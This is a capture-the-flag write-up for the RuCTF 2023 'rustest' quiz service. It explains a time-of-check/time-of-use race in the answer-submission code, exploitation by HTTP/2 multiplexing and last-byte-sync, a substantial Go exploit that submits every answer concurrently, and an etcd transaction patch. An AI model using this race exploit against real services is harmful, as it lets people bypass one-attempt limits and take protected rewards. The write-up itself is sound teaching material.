# RuCTF 2023 | rustest

## Description

Service presents place for creating tests, or victorines. More detailed functionality is:


- register and login as user
- create and rustests
- solve rustests
- list users and rustests


Each rustest contains the reward. The reward of the rustest is a flag data. To get reward of rustest you must answer for all questions of rustest correctly.

## First idea


Rustest is allowed to solve only once to each user. But the questions and correct answers of tests are the same for each user. So, we can iterate over all possible sequence of answers, registering a user for each sequence. 


But, well, there are too many possible sequences of answers. Checker's tests contained 10 questions with 4 variants of answers in each one. To iterate over all possible solutions we need to generate `4**10` sequences!. Moreover, each sequence can be checked for correctnes only using 10 queries at least. It's over 10**6 requests. Considering the fact, that flag is alive only for 15 mins, we need to generate more than 10k requests per second, such a large traffic could harm infrastructure and could be banned by orgs. Moreover, you need to do the same for each team in competition, to steal their flags. 

## Vulnerability

The vulnerability was hidden in logic. It's logical race condition! Let's look at the code of the solving rustest more closely. (Ommiting working with async runtime and error handling).

```rust
// ...
let user_state = self.storage.get_user_state_on_test(&req.user_id, &req.test_id)

if user_state.cur_round != req.round {
    return Err(RustestApplicationError::InvalidDataProvided);
}

if req.round as usize >= rustest.questions.len() {
    return Err(RustestApplicationError::InvalidDataProvided);
}

let question = rustest.questions.get(req.round as usize).unwrap();
let increment_points = req.answer == question.correct_idx;

let next_state = self.storage.increment_user_round_on_test(
    &req.user_id,
    &req.test_id,
    increment_points,
    Some(user_state),
);

if next_state.cur_round as usize >= rustest.questions.len() {
    let final_state = if next_state.points == next_state.cur_round {
        FinalRustestState::Win {
            reward: rustest.reward,
        }
    } else {
        FinalRustestState::Lose
    };

    return Ok(SubmitAnswerResponse::Final { final_state });
}

return Ok(SubmitAnswerResponse::Running {
    question: rustest.questions[next_state.cur_round as usize]
        .clone()
        .into(),
    round: next_state.cur_round,
})
...
```

If we'd look at this code more conceptually, we could see the typicall TOC-TOU (time of check - time of use)

```rust
user_state = get_state();
if some_condition(state) {
    ...
} else {
    ...
}
save_state(user_state);
```

So, imagine four workers on four threads of cpu are trying to execute this function with *four different answers*. All of them have loaded the same state of user. One of the answers is *100% correct*, (because there are 4 answers in total). So, worker, handling the request with correct answer will increment amount of points of user, submitting this answer. 

Yes, service checks, that user hasn't answered more than once in each round. But the state is loaded from storage is the same for all submits and the check of current round will be succeed for all workers.

## Exploitation

To exploit the vulnerability, we have to spam each round of the test with multiple answers concurrently. To make it we can user multiple strategies. 

1) Realy huge amount of requests. But we couldn't sploit the vulnerability in this way.
2) Use http1.1 pipelining. Unfortunetaly, this way wasn't successful too. Because most of the servers execute pipelined http requests sequentially, not concurrently. Rust's axum is not an exception, as we discovered while developing the task. 
3) last-byte-sync. We can create 4 connections, send 4 requests in parrallel, excluding the last byte. The server will be waiting the last byte for each of the requests. And after that, we can send one IP packet with 4 last bytes of each tcp connect. That technique increases probability of race success. 
4) Using http2 multiplexing. Analogue of http1.1 pipelining, but this protocol feature allows to handle requests from one tcp connect concurrently, and send responses to that tcp connect concurrently too (you can read about http2 streams). The author's sploit used this technique. To use http2 with more comfort, go was used to write the exploit.
5) The combination of the methods: we can use last-byte-sync with http2 multiplexing :)

[Sploit](/sploits/rustest/main.go)
```go
// ...
func trySploitRound(ctx context.Context, client *http.Client, state testState, url string, token string, testID string) (maybeFlag string, success bool, nextState *testState, err error) {
	// the final state was provided as previous one
    if state.State == "Final" {
		if state.FinalState.Result == "Lose" {
			return "", false, &state, fmt.Errorf("lose result, user %s", token)
		}

		return *state.FinalState.Reward, true, &state, nil
	}

	var wg sync.WaitGroup
	var roundErr error = nil
	var errOnce sync.Once

	answersNum := len(state.Question.AllowedAnswers)
	responses := make([]testState, answersNum)
	for answer := 0; answer < answersNum; answer++ {
		answer := answer
		wg.Add(1)

        // for each of the allowed answers we are running a goroutine
        // that is sending response to the test
		go func() {
			defer wg.Done()

			resp, err := submitResponse(ctx, client, url, testID, *state.Round, answer, token)
			if err != nil {
				errOnce.Do(func() { roundErr = err })
				return
			}
            // save the response
			responses[answer] = *resp
		}()
	}

    // wait for all the responses
	wg.Wait()

	if roundErr != nil {
		return "", false, nil, fmt.Errorf("error occurred while trying to submit answers: %w", roundErr)
	}

	if responses[0].State == "Final" {
		// that was final question, other responses MUST contain win information
		for _, resp := range responses {
			if resp.State != "Final" {
				return "", false, nil, fmt.Errorf("inconsistent state, not all states are final for user %s", token)
			}

			if resp.FinalState.Result == "Win" {
				return *resp.FinalState.Reward, true, &resp, nil
			}
		}

		// all responses contain not win result
		return "", false, nil, fmt.Errorf("inconsistent state, all final states for user %s are Lose", token)
	}

	rnd := *responses[0].Round
	for _, resp := range responses {
		// all responses must contain equal rounds
		// if round wasn't specified, or round was present, but not equal to round of first response
		if resp.Round == nil || *resp.Round != rnd {
			return "", false, nil, fmt.Errorf("rounds after submits are differrent")
		}
	}

    // all responses contain the same round, we can return any of them. 
	return "", true, &responses[0], nil
}
// ...
func makeClient() *http.Client {
	return &http.Client{
		Transport: &http2.Transport{
			AllowHTTP: true,
			DialTLSContext: func(ctx context.Context, network, addr string, cfg *tls.Config) (net.Conn, error) {
				var d net.Dialer
				return d.DialContext(ctx, network, addr)
			},
		},
	}
}
```

We need to consider the following things in this code:
1) The same http client is passed throug all of the funcitons. That was made for tcp connection reusing for http2 multiplexing. (a lot of reqeusts are sent to the server concurrently through one tcp connect)
2) http client uses http2 transport. 

Yes, the code belives, that the go runtime will use http multiplexing correctly. We could do it manually, using raw bytes. But author was too lazy discover http2 packets format :)

This sploit hacks the test in 15 attempts in average, or in 25 in 0.9 percentile (90% of attacks finished in less than 25 attempts). But every attack contained many requests, but much less than brute force. Moreover, requests are lightweight, traffic ammount wasn't too big. And, one more word to say, many requests were layed in a one tcp packet, and that is good for the network throughoutput.

## Patch

You can patch the service in any way you want, but the author prefered to make a transaction to etcd with checking, that the round is not changed in the storage. 